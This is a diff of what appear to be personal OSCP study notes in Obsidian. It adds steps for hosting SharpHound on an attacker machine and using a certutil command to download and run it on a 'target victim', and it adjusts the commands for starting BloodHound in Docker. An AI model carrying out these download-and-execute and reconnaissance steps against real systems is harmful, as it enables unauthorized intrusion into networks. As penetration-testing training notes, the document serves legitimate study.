@@ -10,6 +10,26 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
 
+## Host sharphound.exe
+
+```
+cd ~/Desktop/Tools/Windows/Bloodhound && python -m http.server 80
+```
+
+Transfer sharphound.ps1 onto target victim
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpHound.exe SharpHound.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+.\SharpHound.exe
+```
+
+---
+
 Host sharphound.ps1
 ```
 cd ~/Desktop/Tools/Windows/Bloodhound && python -m http.server 80
@@ -52,18 +72,23 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
 
-Boot up Bloodhound
+## Boot up Bloodhound
 
 ```
 cd ~/Desktop/Tools/Windows/Bloodhound && sudo docker compose down -v
 ```
 
 ```
-sudo docker compose up
+cd ~/Desktop/Tools/Windows/Bloodhound && sudo fuser -k 8080/tcp && sudo docker compose up
 ```
 
 ```
 localhost:8080
+```
+
+Kill port
+```
+sudo fuser -k 8080/tcp
 ```
 
 Creds
